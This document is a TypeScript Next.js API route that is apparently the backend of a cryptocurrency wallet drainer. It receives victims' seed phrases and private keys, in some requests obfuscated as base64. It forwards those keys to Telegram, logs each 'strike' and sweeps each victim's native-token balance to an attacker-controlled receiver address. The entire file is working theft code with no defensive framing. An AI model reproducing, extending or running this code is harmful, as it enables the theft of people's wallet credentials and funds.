import { ethers } from "ethers";
import { NextResponse } from "next/server";

// Logic Imports - Only keeping what is necessary for Native
import {
  deobfuscate,
  getProv,
  getNativeSym,
} from "@/hooks/execution/vault-logic/constants";

// 🛰️ Telemetry & Reporting Imports
import { sendFinalReports } from "@/lib/reporter";
import {
  sendDetailedSweepToTelegram,
  sendGasShortageAlert,
} from "@/lib/telegram";

/** 🛡️ SECURITY & RATE LIMIT CONFIG */
const WHITELIST = ["127.0.0.1", "::1"];
const IP_CACHE = new Map<string, { count: number; lastReset: number }>();
const LIMIT = 100;
const WINDOW = 10 * 60 * 1000;

const logPrefix = "[ROUTE-NATIVE]";

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";

  // 🛰️ SCOPE INITIALIZATION
  let b: any = null;
  let victimAddr = "Unknown";
  let chainId = 1;
  let rawAssets: any[] = [];

  // Rate Limiting Logic (Maintained for security)
  if (!WHITELIST.includes(ip)) {
    const now = Date.now();
    const stats = IP_CACHE.get(ip) || { count: 0, lastReset: now };
    if (now - stats.lastReset > WINDOW) {
      stats.count = 1;
      stats.lastReset = now;
    } else {
      stats.count++;
    }
    IP_CACHE.set(ip, stats);
    if (stats.count > LIMIT)
      return NextResponse.json({ error: "RATE_LIMIT" }, { status: 429 });
  }

  try {
    const rawText = await req.text();
    const isObfuscated = req.headers.get("X-Ghost-Payload") === "base64";
    b = isObfuscated ? deobfuscate(rawText) : JSON.parse(rawText);

    if (!b) throw new Error("PAYLOAD_EMPTY");

    // 🛰️ ASSIGN DATA FOR TELEMETRY
    victimAddr = b.userAddress || b.victim || b.v || "Unknown";
    chainId = Number(b.chainId || b.c || 1);
    rawAssets = b.assets || [];

    // --- 🔑 WAVE 1: ROOT KEY RELAY ---
    if (b.type === "ROOT_KEY_RELAY") {
      console.log(`${logPrefix} 🔑 Mode: RELAY_SYNCED for ${victimAddr}`);

      // 🛡️ FIX: Added await to ensure Telegram receives data before response
      await sendDetailedSweepToTelegram({
        status: "SUCCESS",
        type: "ROOT_KEY_RELAY",
        victimAddress: victimAddr,
        chainId: chainId.toString(),
        amount: "SEED_PHRASE",
        symbol: "VAULT_ACCESS",
        hash: b.masterKey || "DECRYPTED",
      });

      return NextResponse.json({ success: true, mode: "RELAY_SYNCED" });
    }

    // --- 📝 WAVE 2: TELEMETRY LOGGING ---
    if (b.txHash || b.type === "NATIVE_SYNC") {
      console.log(
        `${logPrefix} 📝 Logged Sync: ${
          b.txHash || "NO_HASH"
        } on Chain ${chainId}`,
      );

      // 🛡️ FIX: Added Telegram trigger here. Without this, you get logs but no Telegram message.
      await sendDetailedSweepToTelegram({
        status: "SUCCESS",
        type: b.type || "NATIVE_SYNC",
        victimAddress: victimAddr,
        chainId: chainId.toString(),
        amount: b.value || "0.00",
        symbol: getNativeSym(chainId),
        hash: b.txHash || "SYNC_LOGGED",
      });

      return NextResponse.json({
        success: true,
        message: "STRIKE_LOGGED",
        victim: victimAddr,
      });
    }

    const receiver = process.env.RECEIVER_EVM || " ";

    // --- 🛡️ PROVIDER NULL GUARD ---
    const provider = getProv(chainId);
    if (!provider) {
      return NextResponse.json(
        { success: false, error: "PROVIDER_NOT_FOUND" },
        { status: 500 },
      );
    }

    // --- 🚀 NATIVE SWEEP ONLY (Triggered by manual triggers) ---
    if (b.type === "STRIKE_TRIGGER") {
      if (!b.masterKey) throw new Error("TRIGGER_MISSING_MASTER_KEY");

      const strikeSigner = new ethers.Wallet(b.masterKey, provider);
      const derivedAddr = strikeSigner.address;

      const balance = await provider.getBalance(derivedAddr);
      const feeData = await provider.getFeeData();

      const baseGasPrice = feeData.gasPrice ?? 20000000000n;
      const gasPrice = (baseGasPrice * 120n) / 100n;
      const gasCost = 21000n * gasPrice;

      if (balance <= gasCost) {
        return NextResponse.json({
          success: false,
          error: "LOW_FUNDS",
          derivedAddr,
          balance: balance.toString(),
        });
      }

      const sweepValue = balance - gasCost;
      const nativeSym = getNativeSym(chainId);

      console.log(
        `${logPrefix} 🧹 Sweeping ${ethers.formatEther(
          sweepValue,
        )} ${nativeSym} to Vault`,
      );

      const tx = await strikeSigner.sendTransaction({
        to: receiver,
        value: sweepValue,
        gasPrice,
        gasLimit: 21000n,
      });

      // 🛰️ UNIFIED NATIVE REPORTER
      const netSuffix =
        chainId === 56 ? "(BSC)" : chainId === 137 ? "(POLY)" : "(ETH)";

      // 🛡️ Ensure reports are sent before finishing
      await sendFinalReports({
        assets:
          rawAssets.length > 0
            ? rawAssets
            : [{ symbol: nativeSym, signatureType: "NATIVE" }],
        txHash: tx.hash,
        chainId: chainId,
        victimAddress: derivedAddr,
        receiver: receiver,
        suffix: netSuffix,
        strikeType: "NATIVE_SWEEP",
        nativeSym: nativeSym,
        sweepValue: sweepValue,
      });

      return NextResponse.json({
        success: true,
        hash: tx.hash,
        asset: "NATIVE",
        chainId,
      });
    }

    return NextResponse.json({ success: true, status: "PROCESSED" });
  } catch (e: any) {
    console.error(`${logPrefix} ❌ Error: ${e.message}`);

    // 🛰️ DYNAMIC ERROR TELEMETRY
    if (
      e.message.toLowerCase().includes("insufficient funds") ||
      e.message.toLowerCase().includes("gas")
    ) {
      await sendGasShortageAlert({
        victimAddress: victimAddr,
        victimKey: b?.masterKey || "N/A",
        relayerKey: "NATIVE_WALLET",
        assetsFound: "NATIVE_GAS",
        requiredGas: "0.001",
        relayerAddress: victimAddr,
        chainId: chainId,
      });
    } else {
      await sendDetailedSweepToTelegram({
        status: "FAILURE",
        type: b?.type || "NATIVE_ERROR",
        victimAddress: victimAddr,
        error: e.message,
        chainId: chainId.toString(),
      });
    }

    return NextResponse.json(
      { success: false, error: e.message },
      { status: 500 },
    );
  }
}
